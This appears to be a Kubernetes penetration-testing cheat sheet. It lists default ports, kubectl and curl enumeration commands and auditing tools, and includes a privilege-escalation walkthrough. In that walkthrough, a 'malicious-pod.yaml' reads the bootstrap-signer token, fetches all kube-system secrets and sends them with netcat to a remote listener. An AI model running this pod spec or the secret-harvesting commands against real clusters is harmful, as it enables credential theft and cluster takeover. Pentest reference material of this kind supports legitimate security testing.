# Kubernetes Penetration Testing

> Kubernetes is an open-source system for automating deployment, scaling, and management of containerized applications.

Main deployments options:
1. On-premise 
2. Managed Cloud Providers

**Note:** Security controls and attack surface will differ from deployment to deployment. 

### Default Services and Ports:

#### Control-plane node(s):

| Protocol      | Port Range    | Service  |
| --- | -----| :--------|
| TCP           | 6443          | Kubernetes API Server - used by all nodes, port is customizable    |
| TCP           | 2379-2380     | etcd server client API -  key value store     |
| TCP           | 10250         | Kubelet API - agent that runs on each node     |
| TCP           | 10251         | kube-scheduler - watches for newly created Pods with no assigned node, and selects a node for them to run on     |
| TCP           | 10252         | kube-controller-manager - runs controller processes |

#### Worker node(s):

| Protocol      | Port Range    | Service  |
| ------------- |:-------------:| :--------|
| TCP           | 10250         | Kubelet API    |
| TCP           | 30000-32767   | Default Range for NodePort Services |

### Popular non-default ports:

<TO BE COMPLETED>

#### Addons

Kubernetes allows installation of addons. Add-ons extend the functionality of Kubernetes. These increase the attack surface and are subject to security vulnerabilities or insecure configurations. (examples: CoreDNS, Web Dashboard)

### Possible Assessments

* External Network - target the internet facing assets looking for exposed Kubernetes services.

* Internal Network - positioned inside the network in a DevOp trusted zone.

* Compromised Container - attacking the infrastructure from a compromised container.

* Compliance Scan - perform an authenticated CIS Kubernetes compliance scan using Nessus. 

### Commands Cheatsheet

#### Enumerate namespaces

```
kubectl get ns
```

#### List pods in a namespace

```
kubectl get pods --namespace=<namespace>
```

#### Execute commands in a pod (spawn shell)

```
kubectl exec <pod> -i --tty --namespace=<pod_namespace> -- /bin/bash
```

#### Get services

```
kubectl get svc --all-namespaces
```

#### Get all secrets

```
kubectl get secrets --all-namespaces
```

#### API discovery

```
curl -k https://<IP Address>:8080
curl -k https://<IP Address>:(8|6)443/swaggerapi
curl -k https://<IP Address>:(8|6)443/healthz
curl -k https://<IP Address>:(8|6)443/api/v1
curl -k https://<IP address>:10250
curl -k https://<IP address>:10250/metrics
curl -k https://<IP address>:10250/pods
```

#### Kubelet API (Read Only - Old Releases)

```
curl -k https://<IP Address>:10255
curl -k http://<IP Address>:10255/pods
```

#### etcd Key Store API

```
curl -k https://<IP address>:2379
curl -k https://<IP address>:2379/version
etcdctl --endpoints=http://<MASTER-IP>:2379 get / --prefix --keys-only
```

#### Authenticated External API Requests 

Assuming you already obtained a token: 

```
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/

# List Pods
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/<default>/pods/

# List secrets
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/<default>/secrets/

# List deployments
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip:<port>/apis/extensions/v1beta1/namespaces/<default>/deployments

# List daemonsets
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip:<port>/apis/extensions/v1beta1/namespaces/<default>/daemonsets
```

#### Service Token Grabber

Every container in a pod has a generated service token mounted as a volume to be able to authenticate and make requests to the Kubernetes API.

```
#Find where the service token is mounted
mount | grep kubernetes 

ls /var/run/secrets/kubernetes.io/serviceaccount
```

#### RBAC Testing (Whitebox)

Role-based access control (RBAC) is used for regulating access to kubernetes resources. After having enough permissions to export the roles and permissions, these can be analyzed offline using the ExtensiveRoleCheck python tool.

```
python ExtensiveRoleCheck.py --clusterRole clusterroles.json  --role Roles.json --rolebindings rolebindings.json --cluseterolebindings clusterrolebindings.json
```

#### Privilege Escalation Via Malicious Pod Creation

An attacker who gains control of a service account with the privilege to create pods in the **"kube-system"** namespace can potentially escalate privileges by reading tokens from other privileged service accounts. By default, the “bootstrap-signer” service account has the privilege to list all tokens in the cluster 

Step 1. We check if the bootstrap-signer service account has privileges to list all tokens

```
kubectl get role system:controller:bootstrap-signer -n kube-system -o yaml
```

Step 2. Create an "evil" pod that will mount the "bootstrap-signer" service account token

Step 2.1. Create a YAML file that describes the pod, mounts the "bootstrap-signer" and reads all the secrets from the API server and sends them to our remote listener

malicious-pod.yaml:

```
apiVersion: v1
kind: Pod
metadata:
  name: alpine
  namespace: kube-system
spec:
  containers:
  - name: alpine
    image: alpine
    command: ["/bin/sh"]
    args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 443; sleep 100000']
  serviceAccountName: bootstrap-signer
  automountServiceAccountToken: true
  hostNetwork: true
```

Step 3. Launch the netcat listener

```
nc -nlvp 443
```

Step 4. Create the "evil" pod

```
kubectl apply -f malicious-pod.yaml
```

**Evil pods can also be created by crafting malicious yaml files of other objects suchs as daemonsets, replicasets, jobs etc. which support the "PodTemplateSpec":**

(https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.11/#podtemplatespec-v1-core)

```
DaemonSetSpec [apps/v1]
DaemonSetSpec [apps/v1beta2]
DaemonSetSpec [extensions/v1beta1]
DeploymentSpec [apps/v1]
DeploymentSpec [apps/v1beta2]
DeploymentSpec [apps/v1beta1]
DeploymentSpec [extensions/v1beta1]
JobSpec [batch/v1]
PodTemplate [core/v1]
ReplicaSetSpec [apps/v1]
ReplicaSetSpec [apps/v1beta2]
ReplicaSetSpec [extensions/v1beta1]
ReplicationControllerSpec [core/v1]
StatefulSetSpec [apps/v1]
StatefulSetSpec [apps/v1beta2]
StatefulSetSpec [apps/v1beta1]
```



### Tools

* [peirates](https://github.com/inguardians/peirates) - a Kubernetes penetration tool, enables an attacker to escalate privilege and pivot through a Kubernetes cluster. It automates known techniques to steal and collect service accounts, obtain further code execution, and gain control of the cluster.

* [kube-hunter](https://github.com/aquasecurity/kube-hunter) - hunts for security weaknesses in Kubernetes clusters.

* [ExtensiveRoleCheck](https://github.com/cyberark/kubernetes-rbac-audit) - is a Python tool that scans the Kubernetes RBAC for risky roles.

* [kubeaudit](https://github.com/Shopify/kubeaudit) - is a command line tool to audit Kubernetes clusters for various different security concerns: run the container as a non-root user, use a read only root filesystem, drop scary capabilities, don't add new ones, don't run privileged etc.

* [kube-bench](https://github.com/aquasecurity/kube-bench) - Checks whether Kubernetes is deployed according to security best practices as defined in the CIS Kubernetes Benchmark.

* [katacoda](https://katacoda.com/) - Learn Kubernetes using interactive broser-based scenarios.

### References 

* [Default Roles and RoleBindings](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#default-roles-and-role-bindings) 